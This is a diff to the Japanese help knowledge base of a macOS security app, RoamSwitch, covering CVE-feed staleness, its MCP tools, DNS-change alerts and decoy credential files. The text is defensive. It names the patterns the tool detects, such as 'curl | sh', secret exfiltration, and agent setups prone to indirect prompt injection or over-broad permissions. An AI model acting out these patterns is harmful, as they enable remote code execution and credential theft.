@@ -649,6 +669,7 @@ extension RoamSwitchKnowledgeBase {
                 • データ配信: CVEマップは週に1回、署名付きマニフェストから受信専用で取得します。未取得の間は「未取得」と表示され、何も検出しません。
                 • MCPツール: `run_package_cve_scan`（Homebrew）と `run_package_cve_scan_languages`（依存関係、`watchedFolders` 引数）。
                 • 「何も調べていません」の場合: Homebrewが無い、brewが失敗した、パッケージが0件のときは、緑の「見つかりませんでした」ではなく、灰色で「何も調べていません」と出ます（`run_package_cve_scan` の homebrewInventory が brew_missing か brew_failed）。CVEデータの更新が失敗しているときは、最後に更新できた日時と失敗の理由を窓とメニューに出し、`get_guard_status` の feedUpdates にも入ります。
+                • 更新が止まったとき: 使っているデータを、更新の処理が1週間(週に1回しか取得しない2つのCVE地図は2週間)確認していないと(確認に失敗した場合も、確認したものと数えます)、メニューに、そのデータの名前と最後に確認した日時を示す警告の行を出します。`get_guard_status` では signedUpdates が off(理由 state_stale)になり、そのデータは feedUpdates で stale: true になります。対象は、パッケージCVEの地図とWebルール、リンク保護の自動更新がオン(Pro)のときのリンクの一覧、アクティブスキャンがオンのときのアクティブスキャンのCVE地図です。RoamSwitchを再起動すると、すぐに確認します。一度も確認していないデータは、止まったとは数えません(画面には「まだ更新できていません」と出ます)。
                 """,
                 recommendation: "定期的にHomebrewのスキャンを実行し、開発中のプロジェクトは依存関係タブに登録して、重大なCVEを含むパッケージを早めに更新してください。"
             ),
@@ -834,7 +855,7 @@ extension RoamSwitchKnowledgeBase {
                 summary: "RoamSwitch.appにはMCP（Model Context Protocol）サーバーが同梱されており、ClaudeなどのAIアシスタントからMacのセキュリティ状況を問い合わせられます。設定・保護レベル・ポート・デバイスを変更するツールは一切ありません。書き込みを伴うのは、自身の記録ファイルを更新する3つのツールだけです。",
                 details: """
                 • 通信: ローカルの標準入出力（stdio）のみ。バイナリは `/Applications/RoamSwitch.app/Contents/MacOS/RoamSwitchMCPServer`。
-                • 主なツール（全35種）: `get_security_report`（総合診断）、`verify_security_findings`（診断の指摘が今も残っているかの再確認・読み取り専用）、`get_exposed_ports`、`get_guard_status`、`audit_url_safety`、`audit_secrets`、`audit_mcp_configs`（MCPクライアントの設定ファイルにある危険な記述を点検。第三者の文章を読むサーバーとコマンド実行系のサーバーが同じ設定にある構成（間接プロンプトインジェクションの前提）も指摘する。ローカル・読み取り専用。メニュー「マルウェア対策」→「🧩 MCP設定（AI連携）を監査…」の専用画面でも実行できる）、`audit_agent_setup`（AIエージェントに読ませる指示ファイル・スキルとOpenClawの設定にある危険な記述を点検。見えないUnicode文字・指示の上書き・curl | sh・秘密の持ち出しの形など。エージェントのメモリも同じ規則で点検し、登録したプロジェクトの `.vscode/tasks.json`（フォルダを開くと自動で実行されるタスク）と `.github/workflows`（プルリクエストのコードの実行・他人の文字列のスクリプトへの埋め込み・コミットで固定していない外部アクション）も点検。Claude Code の設定（`~/.claude` と、登録したプロジェクトの `.claude` にある `settings.json`・`settings.local.json`）では、確認なしにすべてを実行する権限モード、どんなコマンドも許可する広すぎる許可、フック、API の接続先の変更も点検し、確認済みにした後で設定が緩くなったこと（禁止ルールの削除、広い許可やフックの追加、権限モードの引き上げ、サンドボックスの無効化）も指摘。ルールやコマンドの文字は結果に出さない。ローカル・読み取り専用。メニュー「マルウェア対策」→「🤖 AIエージェントの指示ファイルを監査…」の専用画面でも実行できる）、`audit_security_logs`、`get_quarantine_status`、`get_notification_history`、`get_canary_status`、`get_port_anomaly_incidents`、`get_ssh_guard_incidents`（SSH総当たりの記録と最近のSSHログイン・読み取り専用）、`get_runtime_threat_status`、`get_incident_timeline`（封じ込めインシデント履歴）、`get_detection_coverage`（RoamSwitchが検知できない攻撃手口を一覧にして確認。読み取り専用）、`get_network_history`（ネットワーク履歴学習）、`run_package_cve_scan`、`run_package_cve_scan_languages`、`run_active_vuln_scan`（127.0.0.1への非破壊プローブのみ）、`run_npm_audit_signatures`（外部サーバー=npmレジストリへ通信する唯一のツール。Pro・オプトイン）、`get_app_help`（このナレッジベース）。
+                • 主なツール（全35種）: `get_security_report`（総合診断）、`verify_security_findings`（診断の指摘が今も残っているかの再確認・読み取り専用。解消した項目が、直したものか元から当てはまらなかったものかは `change` で区別）、`get_exposed_ports`、`get_guard_status`、`audit_url_safety`、`audit_secrets`、`audit_mcp_configs`（MCPクライアントの設定ファイルにある危険な記述を点検。第三者の文章を読むサーバーとコマンド実行系のサーバーが同じ設定にある構成（間接プロンプトインジェクションの前提）も指摘する。ローカル・読み取り専用。メニュー「マルウェア対策」→「🧩 MCP設定（AI連携）を監査…」の専用画面でも実行できる）、`audit_agent_setup`（AIエージェントに読ませる指示ファイル・スキルとOpenClawの設定にある危険な記述を点検。見えないUnicode文字・指示の上書き・curl | sh・秘密の持ち出しの形など。エージェントのメモリも同じ規則で点検し、登録したプロジェクトの `.vscode/tasks.json`（フォルダを開くと自動で実行されるタスク）と `.github/workflows`（プルリクエストのコードの実行・他人の文字列のスクリプトへの埋め込み・コミットで固定していない外部アクション）も点検。Claude Code の設定（`~/.claude` と、登録したプロジェクトの `.claude` にある `settings.json`・`settings.local.json`）では、確認なしにすべてを実行する権限モード、どんなコマンドも許可する広すぎる許可、フック、API の接続先の変更も点検し、確認済みにした後で設定が緩くなったこと（禁止ルールの削除、広い許可やフックの追加、権限モードの引き上げ、サンドボックスの無効化）も指摘。ルールやコマンドの文字は結果に出さない。ローカル・読み取り専用。メニュー「マルウェア対策」→「🤖 AIエージェントの指示ファイルを監査…」の専用画面でも実行できる）、`audit_security_logs`、`get_quarantine_status`、`get_notification_history`、`get_canary_status`、`get_port_anomaly_incidents`、`get_ssh_guard_incidents`（SSH総当たりの記録と最近のSSHログイン・読み取り専用）、`get_runtime_threat_status`、`get_incident_timeline`（封じ込めインシデント履歴）、`get_detection_coverage`（RoamSwitchが検知できない攻撃手口を一覧にして確認。読み取り専用）、`get_network_history`（ネットワーク履歴学習）、`run_package_cve_scan`、`run_package_cve_scan_languages`、`run_active_vuln_scan`（127.0.0.1への非破壊プローブのみ）、`run_npm_audit_signatures`（外部サーバー=npmレジストリへ通信する唯一のツール。Pro・オプトイン）、`get_app_help`（このナレッジベース）。
                 • プロセス実行の記録(Pro・読み取り専用): `search_exec_events`(起動イベントの検索)、`get_process_tree`(祖先・子孫のプロセスツリー)。
                 • リソース: `roamswitch://docs/features`、`roamswitch://docs/alerts-and-messages`、`roamswitch://docs/settings-guide`、`roamswitch://docs/troubleshooting`。
                 • 言語: 回答はアプリの言語設定に従います。`get_app_help` は `language` 引数（ja / en / zh-Hans / zh-Hant / ko / de / fr / es / it / pt-PT）で言語を指定できます。
@@ -1218,6 +1239,7 @@ extension RoamSwitchKnowledgeBase {
                 summary: "接続中のネットワークが配ったDNSサーバーやルーター、プロキシ自動構成(PAC)が、同じネットワークの以前の状態と違います。偽のDHCPサーバーやWPADによる中間者攻撃の可能性があります。",
                 details: """
                 • 通知の内容: ネットワーク名と、以前は見なかったDNSサーバー、ルーター、PACのホスト、またはWPADがオンになったことです。
+                • サービスの保存済みの設定にDNSサーバーが加わった場合(サービス名つきで表示): `networksetup -setdnsservers` やネットワークの設定画面で、本人、管理者、プログラムのいずれかが書いたもので、どれかは分かりません。心当たりがなければ、システム設定のネットワークでDNSサーバーを元に戻してください。
                 • 無害な原因の例: ルーターやプロバイダーの交換、設定変更。会社や学校のネットワークで管理者が設定を変えた場合。
                 • 自動の対処: 通知のみです。設定の変更も、通信の遮断も行いません。同じ内容の通知は1回だけです。
                 """,
@@ -1291,13 +1313,13 @@ extension RoamSwitchKnowledgeBase {
                 summary: "RoamSwitchが置いた偽の認証情報ファイル（~/.aws/credentials など）が読まれたことを知らせる通知です。",
                 details: """
                 • 通知に出る情報: 読まれた偽ファイルのパス、アクセス元のプログラム（パスと PID）、その親プロセス、コマンド（秘密は伏せ字）。
-                • アクセス元を特定できないとき: 通知にそう書き、確認した内容（ファイルを開いているプロセスの確認、プロセス実行の記録の照会）も示します。読んだプロセスはすでに終了していることが多く、その場合は「プロセス実行の記録」がオンなら、同じ時刻に起動したコマンドを挙げます（それが読んだとは限りません）。
+                • アクセス元を特定できないとき: 通知にそう書き、確認した内容（ファイルを開いているプロセスの確認、プロセス実行の記録の照会）も示します。読んだプロセスはすでに終了していることが多く、その場合は「プロセス実行の記録」がオンなら、同じ時刻に起動したコマンドを挙げます（それが読んだとは限りません）。「ファイルを開いたプロセスの記録」がオンなら(「プロセス実行の記録」ウィンドウ)、読んだプロセス自身を PID・親・コマンド・署名つきで挙げ、同じ時刻に起動したコマンドの推測は載せません。オフ・負荷で一時停止・開始前のときは、通知にそう書きます。
                 • 自動防御: 通知と記録のみ（関連する囮を追加で置きます。通信の遮断はしません）。
                 """,
                 recommendation: """
                 1. アクセス元のパスとコマンドを見て、自分が実行したものか確認してください。
                 2. 心当たりがなければ、そのプログラムの場所と署名を確認し、実行を止めて、該当する認証情報（AWS キー・SSH 鍵・Docker の認証など）を失効・再発行してください。
-                3. アクセス元が分からないときは、「プロセス実行の記録」をオンにすると、次からは同じ時刻に起動したコマンドが通知に載ります（feat_exec_recorder）。
+                3. アクセス元が分からないときは、「プロセス実行の記録」をオンにすると、次からは同じ時刻に起動したコマンドが通知に載ります（feat_exec_recorder）。読んだプロセス自身を知りたいときは、同じウィンドウで「ファイルを開いたプロセスの記録」もオンにしてください。
                 """
             ),
             LocalizedEntry(
@@ -1366,7 +1388,7 @@ extension RoamSwitchKnowledgeBase {
                 • 後から追加されたガードも、既存のProユーザーに対して各ガードごとに1回だけ既定値が適用されます。オフにしたガードは、ライセンスを再有効化してもオフのままです。ライセンスを解除するとPro専用ガードは無効化され、オンだったものは次にProを有効化したときに既定でオンへ戻ります。
                 • メニューの印: ✅ は設定がオンで動いています。🟡 は一部だけ動いています（ヘルパー未接続、システム拡張が承認待ち、読めないファイルがある）。⚠️ は設定がオンなのに動いていません（Proが無効、ヘルパー未接続、入力を読めない、監視するものがない、おとりを置けていない）。理由は項目の末尾の［　］と、項目に重ねたときの説明に出ます。同じ状態が `get_guard_status` の liveState と liveStateReason です。
                 • ライセンスが検証できないまま起動したとき: Proの期限切れ、別のMac用、署名が無効などで、保存したライセンスが検証できないと、設定がオンのまま止まっている保護を名指しした通知を、起動の直後に1回出します。Proを初めて有効にした直後にも、オンになった保護、自分でオンにする保護、まだ動かない理由（ヘルパーの承認、システム拡張の承認、フルディスクアクセス、監視フォルダーの登録）を、通知で1回出します。
-                • 自己監視（クラッシュ時の自動再起動）: 既定ではオフです。メニューの「自己監視…」で同意すると、アプリに含まれる見張りのプログラムをログイン項目として登録します（システム設定での承認が要ることがあります）。状態はメニューと `get_detection_coverage`（T1562.001 の liveState と liveStateReason）に出ます。止めるのも同じ項目からで、アンインストールでも外れます。承認したあと、見張りは次にログインしたときから動きます。
+                • 自己監視（クラッシュ時の自動再起動）: 既定ではオフです。メニューの「自己監視…」で同意すると、アプリに含まれる見張りのプログラムをログイン項目として登録します（システム設定での承認が要ることがあります）。状態はメニューと `get_detection_coverage`（T1685 の liveState と liveStateReason）に出ます。止めるのも同じ項目からで、アンインストールでも外れます。承認したあと、見張りは次にログインしたときから動きます。
                 • macOSの通知が許可されていない、または通知のスタイルが「なし」のとき、警告は画面に出ません（通知履歴には残ります）。メニューの最上段に「通知が許可されていません…」の行が出て、診断と通知履歴の窓に帯が出ます。初回の案内にも、通知と、あとで要る許可（フルディスクアクセス、システム拡張、アクセシビリティ、位置情報）の頁があります。
                 """,
                 recommendation: "Pro有効化後はメニューの ✅ 表示を確認し、使い方に合わないガード（例: Dockerを使わない）はそのまま、必要なもの（例: 公衆Wi-Fiが多いならVPN）を追加で有効にしてください。"
